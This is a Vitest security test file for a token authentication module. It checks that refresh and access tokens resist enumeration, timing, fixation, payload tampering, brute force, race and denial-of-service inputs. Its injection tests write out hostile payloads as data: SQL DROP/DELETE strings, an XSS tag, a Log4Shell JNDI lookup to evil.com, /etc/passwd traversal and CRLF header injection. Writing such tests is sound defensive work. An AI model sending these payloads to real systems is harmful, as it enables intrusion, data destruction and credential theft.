import { describe, test, expect, beforeAll, afterAll, beforeEach } from 'vitest';
import crypto from 'crypto';
import { generateAccessToken, verifyAccessToken } from '../../../src/accessTokens.js';
import { generateRefreshToken, verifyRefreshToken, rotateRefreshToken } from '../../../src/refreshTokens.js';
import { 
  setupTestDatabase, 
  teardownTestDatabase, 
  setupTestUser, 
  cleanupTestData,
  mockBotDetector 
} from '../test-setup.js';

// Mock bot detector for controlled testing
mockBotDetector();

describe('Advanced Security Attack Patterns', () => {
  beforeAll(async () => {
    await setupTestDatabase();
  });

  afterAll(async () => {
    await teardownTestDatabase();
  });

  beforeEach(async () => {
    await cleanupTestData(999, 888);
    await setupTestUser(999, 888);
  });

  test('should detect token enumeration attacks', async () => {
    const userId = 999;
    
    // Generate one valid token
    const validToken = await generateRefreshToken(24 * 60 * 60 * 1000, userId);
    
    // Attempt enumeration with sequential modifications
    const enumerationAttempts = [];
    for (let i = 0; i < 20; i++) {
      const modifiedToken = validToken.raw.slice(0, -2) + i.toString(16).padStart(2, '0');
      enumerationAttempts.push(verifyRefreshToken(modifiedToken));
    }
    
    const results = await Promise.allSettled(enumerationAttempts);
    
    // All enumeration attempts should fail
    const failures = results.filter(result => 
      result.status === 'rejected' || 
      (result.status === 'fulfilled' && !result.value.valid)
    );
    
    expect(failures.length).toBe(20);
  });

  test('should detect timing attack attempts', async () => {
    const userId = 999;
    
    const validToken = await generateRefreshToken(24 * 60 * 60 * 1000, userId);
    const invalidToken = 'a'.repeat(128);
    
    // Measure timing for valid and invalid tokens
    const timingResults = [];
    
    for (let i = 0; i < 10; i++) {
      // Valid token timing
      const validStart = process.hrtime.bigint();
      await verifyRefreshToken(validToken.raw);
      const validEnd = process.hrtime.bigint();
      const validTime = Number(validEnd - validStart) / 1000000; // Convert to milliseconds
      
      // Invalid token timing
      const invalidStart = process.hrtime.bigint();
      await verifyRefreshToken(invalidToken);
      const invalidEnd = process.hrtime.bigint();
      const invalidTime = Number(invalidEnd - invalidStart) / 1000000;
      
      timingResults.push({ valid: validTime, invalid: invalidTime });
    }
    
    // Calculate average timings
    const avgValidTime = timingResults.reduce((sum, r) => sum + r.valid, 0) / timingResults.length;
    const avgInvalidTime = timingResults.reduce((sum, r) => sum + r.invalid, 0) / timingResults.length;
    
    // Timing difference should be minimal (constant time comparison)
    const timingRatio = Math.abs(avgValidTime - avgInvalidTime) / Math.max(avgValidTime, avgInvalidTime);
    
    // Allow some variance but should be reasonably consistent
    expect(timingRatio).toBeLessThan(2.0); // Less than 200% difference
  });

  test('should handle session fixation attempts', async () => {
    const userId = 999;
    const attackerUserId = 998;
    
    // Setup attacker user
    await cleanupTestData(attackerUserId, 887);
    await setupTestUser(attackerUserId, 887);
    
    // Attacker generates a token
    const attackerToken = await generateRefreshToken(24 * 60 * 60 * 1000, attackerUserId);
    
    // Try to use attacker's token for victim user (session fixation)
    const fixationResult = await rotateRefreshToken(24 * 60 * 60 * 1000, userId, attackerToken.raw);
    
    // Should fail - can't rotate another user's token
    expect(fixationResult.rotated).toBe(false);
    
    // Clean up
    await cleanupTestData(attackerUserId, 887);
  });

  test('should detect privilege escalation attempts', async () => {
    const normalUserId = 999;
    const adminUserId = 998;
    
    // Setup admin user
    await cleanupTestData(adminUserId, 887);
    await setupTestUser(adminUserId, 887);
    
    // Generate token for normal user
    const normalToken = await generateAccessToken(normalUserId, 888);
    
    // Attempt to verify with admin privileges (tampering)
    const verification = await verifyAccessToken(normalToken.raw);
    
    if (verification.valid) {
      // Token should maintain original user context
      expect(verification.payload?.userId || verification.payload?.user_id).toBe(normalUserId);
      expect(verification.payload?.userId || verification.payload?.user_id).not.toBe(adminUserId);
    }
    
    // Try token manipulation for privilege escalation
    const tokenParts = normalToken.raw.split('.');
    if (tokenParts.length === 3) {
      try {
        // Attempt to modify payload
        const payload = JSON.parse(Buffer.from(tokenParts[1], 'base64').toString());
        payload.userId = adminUserId; // Try to escalate
        payload.user_id = adminUserId;
        
        const modifiedPayload = Buffer.from(JSON.stringify(payload)).toString('base64');
        const tamperedToken = `${tokenParts[0]}.${modifiedPayload}.${tokenParts[2]}`;
        
        const tamperedVerification = await verifyAccessToken(tamperedToken);
        
        // Should fail due to signature mismatch
        expect(tamperedVerification.valid).toBe(false);
        
      } catch (error) {
        // Token manipulation failure is expected
        expect(error).toBeDefined();
      }
    }
    
    // Clean up
    await cleanupTestData(adminUserId, 887);
  });

  test('should handle brute force attacks on token verification', async () => {
    const userId = 999;
    
    // Generate rapid verification attempts with invalid tokens
    const bruteForceStime = performance.now();
    const attempts = [];
    
    for (let i = 0; i < 50; i++) {
      const fakeToken = crypto.randomBytes(64).toString('hex');
      attempts.push(verifyRefreshToken(fakeToken));
    }
    
    const results = await Promise.allSettled(attempts);
    const bruteForceTime = performance.now() - bruteForceStime;
    
    // All attempts should fail
    const failures = results.filter(result => 
      result.status === 'rejected' || 
      (result.status === 'fulfilled' && !result.value.valid)
    );
    
    expect(failures.length).toBe(50);
    
    // Should have some rate limiting or delay mechanism
    expect(bruteForceTime).toBeGreaterThan(100); // At least 100ms total
  });

  test('should prevent token injection attacks', async () => {
    const userId = 999;
    
    const injectionPayloads = [
      '"; DROP TABLE refresh_tokens; --',
      "'; DELETE FROM users WHERE id = 999; --",
      '<script>alert("xss")</script>',
      '${jndi:ldap://evil.com/a}',
      '../../../etc/passwd',
      'null\x00byte',
      '\'; UNION SELECT 1,2,3,4,5,6,7,8 --',
      '{{7*7}}', // Template injection
      '${7*7}', // Expression injection
      '#{7*7}' // Spring EL injection
    ];

    for (const payload of injectionPayloads) {
      try {
        const verification = await verifyRefreshToken(payload);
        
        // Should fail gracefully without errors
        expect(verification.valid).toBe(false);
        
      } catch (error) {
        // Injection attempts should be safely handled
        expect(error).toBeDefined();
      }
    }
  });

  test('should handle memory exhaustion attempts', async () => {
    const userId = 999;
    
    // Attempt to create very large tokens (if input validation allows)
    const largePayloads = [
      'A'.repeat(1024 * 1024), // 1MB
      'B'.repeat(64 * 1024), // 64KB
      'C'.repeat(8 * 1024), // 8KB
    ];

    for (const payload of largePayloads) {
      try {
        const verification = await verifyRefreshToken(payload);
        expect(verification.valid).toBe(false);
        
      } catch (error) {
        // Large payload rejection is expected
        expect(error).toBeDefined();
      }
    }
  });

  test('should prevent race condition exploits', async () => {
    const userId = 999;
    
    // Generate a token
    const token = await generateRefreshToken(24 * 60 * 60 * 1000, userId);
    
    // Attempt concurrent operations that could create race conditions
    const racePromises = [
      verifyRefreshToken(token.raw),
      verifyRefreshToken(token.raw),
      rotateRefreshToken(24 * 60 * 60 * 1000, userId, token.raw),
      rotateRefreshToken(24 * 60 * 60 * 1000, userId, token.raw),
      verifyRefreshToken(token.raw)
    ];

    const raceResults = await Promise.allSettled(racePromises);
    
    // Should handle concurrent operations gracefully
    const successful = raceResults.filter(result => result.status === 'fulfilled');
    expect(successful.length).toBeGreaterThan(0);
    
    // At most one rotation should succeed
    const rotations = raceResults.slice(2, 4);
    const successfulRotations = rotations.filter(result => 
      result.status === 'fulfilled' && 
      (result as any).value?.rotated === true
    );
    expect(successfulRotations.length).toBeLessThanOrEqual(1);
  });

  test('should detect token reuse patterns', async () => {
    const userId = 999;
    const tokens = [];
    
    // Generate multiple tokens
    for (let i = 0; i < 5; i++) {
      const token = await generateRefreshToken(24 * 60 * 60 * 1000, userId);
      tokens.push(token);
    }
    
    // Use same token multiple times (suspicious pattern)
    const reusePattern = [];
    for (let i = 0; i < 10; i++) {
      const verification = await verifyRefreshToken(tokens[0].raw);
      reusePattern.push(verification);
    }
    
    // Should detect and potentially prevent excessive reuse
    const validReuses = reusePattern.filter(v => v.valid);
    
    // Either all should be valid (if reuse allowed) or some should fail (if detected)
    expect(validReuses.length <= 10).toBe(true);
  });

  test('should handle malicious header injection', async () => {
    const userId = 999;
    
    // Create tokens with malicious-looking content
    const maliciousHeaders = [
      'Content-Type: text/html\r\n\r\n<script>alert(1)</script>',
      'X-Forwarded-For: 127.0.0.1\r\nSet-Cookie: admin=true',
      'Authorization: Bearer malicious\r\nHost: evil.com',
    ];

    for (const header of maliciousHeaders) {
      try {
        // These shouldn't be valid tokens
        const verification = await verifyRefreshToken(header);
        expect(verification.valid).toBe(false);
        
      } catch (error) {
        // Header injection attempts should be safely handled
        expect(error).toBeDefined();
      }
    }
  });

  test('should prevent algorithmic complexity attacks', async () => {
    const userId = 999;
    
    // Test with patterns that could cause exponential processing time
    const complexityAttacks = [
      '('.repeat(1000) + ')'.repeat(1000), // Nested parentheses
      'a'.repeat(10000), // Very long string
      '.*'.repeat(100), // Regex complexity
      Array(1000).fill('test').join('|'), // OR complexity
    ];

    for (const attack of complexityAttacks) {
      const startTime = performance.now();
      
      try {
        const verification = await verifyRefreshToken(attack);
        expect(verification.valid).toBe(false);
        
      } catch (error) {
        // Complexity attack rejection is expected
        expect(error).toBeDefined();
      }
      
      const endTime = performance.now();
      const processingTime = endTime - startTime;
      
      // Should not take excessively long (prevent DoS)
      expect(processingTime).toBeLessThan(5000); // Less than 5 seconds
    }
  });
});